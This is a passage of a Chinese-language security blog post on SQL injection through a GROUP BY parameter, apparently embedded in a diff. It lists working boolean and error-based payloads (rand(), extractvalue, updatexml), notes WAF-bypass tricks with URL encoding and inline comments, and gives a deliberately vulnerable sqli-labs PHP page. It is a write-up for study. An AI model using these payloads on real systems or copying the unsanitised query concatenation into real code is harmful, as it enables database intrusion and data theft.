+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>最近帮朋友看了个注入点，是一个Groupby注入点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/api?pageSize=-1&amp;groupBy=id</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在groupby参数的id加上单引号，引起报错，泄露SQL语句</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739474.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739474.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739474.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739474.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 635;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以看到这里的group by 是存在拼接的，这个id是可控的，很明显是一个注入点。</p>
+<p>把SQL语句简化以下就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select 1,2,3...,17 from table were table.a is null group by table.id</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这其中的id是可控的，传进去就会与table.进行拼接，像这个group by位置的注入点，我很少有见到。</p>
+<p>先说结果，注出来了，有waf，最后的几种payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="err">转换成</span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="err">，利用</span><span class="n">rand</span><span class="p">()</span><span class="err">进行条件布尔注入：</span><span class="n">id</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">rand</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;8&#39;</span><span class="p">)</span><span class="err">，</span><span class="n">url编码绕过waf</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">+</span><span class="k">order</span><span class="o">+</span><span class="k">by</span><span class="o">+</span><span class="n">rand</span><span class="p">(</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">75</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">72</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">76</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">72</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">69</span><span class="o">%</span><span class="mi">6</span><span class="n">f</span><span class="o">%</span><span class="mi">6</span><span class="n">e</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;8&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">报错注入，</span><span class="n">id</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">())))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="cm">/**/</span><span class="k">and</span><span class="cm">/**/</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="p">,</span><span class="cm">/*!60000select*//**/</span><span class="k">version</span><span class="p">()))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">报错注入，</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="cm">/**/</span><span class="k">and</span><span class="cm">/**/</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="cm">/*!12345select*//**/</span><span class="k">version</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>布尔注入的顺序会不同，得出版本：</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739431.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739431.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739431.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739431.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 469;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里我字符加少了，只加了数字0-9，字母a-f，和符号.号，但版本的话大部分情况下数字0-9，加上符号点号.，够用了。如果是数据库名的话，想要全一点就是大小写字母+数字+短杠和下划线。</p>
+<p>报错注入截图：</p>
+<p>extractvalue语句：</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739491.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739491.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739491.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739491.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 636;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>updatexml语句：</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739688.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739688.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739688.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739688.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 633;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="本地环境" class="heading-element"><span>本地环境</span>
+  <a href="#%e6%9c%ac%e5%9c%b0%e7%8e%af%e5%a2%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>因为group by后面的注入点之前没怎么遇到过，这次就顺便研究下，在本地数据库mysql下进行测试。</p>
+<p>改了下sqli-labs做案例，新建了一个less，代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;../sql-connections/sql-connect.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;groupby&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$groupby</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;groupby&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;select * from users where username like &#39;admin%&#39; group by </span><span class="si">$groupby</span><span class="s2"> &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#$sql=&#34;select * from users where username like &#39;admin%&#39; group by user.$groupby &#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$result</span><span class="o">=</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="nv">$sql</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$rows</span> <span class="o">=</span>  <span class="nx">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="s1">&#39;查询结果共有&#39;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s1">&#39;条记录&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="s2">&#34;&lt;table&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;tr&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;th&gt;序号&lt;/th&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;th&gt;姓名&lt;/th&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;th&gt;密码&lt;/th&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;tr&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$rows</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$count</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        	<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            	<span class="k">echo</span> <span class="s2">&#34;&lt;tr&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                	 &lt;td&gt;&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;/td&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                 	&lt;td&gt;&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;/td&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                 	&lt;td&gt;&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;/td&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">             	&lt;/tr&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">        	<span class="nv">$count</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">echo</span> <span class="s2">&#34;&lt;/table&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&#34;Please input the ID as parameter with numeric value&#34;</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>下面演示用到了两个数据表。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">sqli</span><span class="o">-</span><span class="n">labs</span><span class="w"> </span><span class="err">数据库，版本</span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">26</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Dumb</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">Dumb</span><span class="w">       </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Angelina</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">I</span><span class="o">-</span><span class="n">kill</span><span class="o">-</span><span class="n">you</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Dummy</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">p</span><span class="o">@</span><span class="n">ssword</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">secure</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">crappy</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">stupid</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">stupidity</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">6</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">superman</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">genious</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">batman</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">mob</span><span class="o">!</span><span class="n">le</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">dhakkan</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">dumbo</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">13</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">02</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">自建数据库，版本</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">31</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+----------+------+-----------+
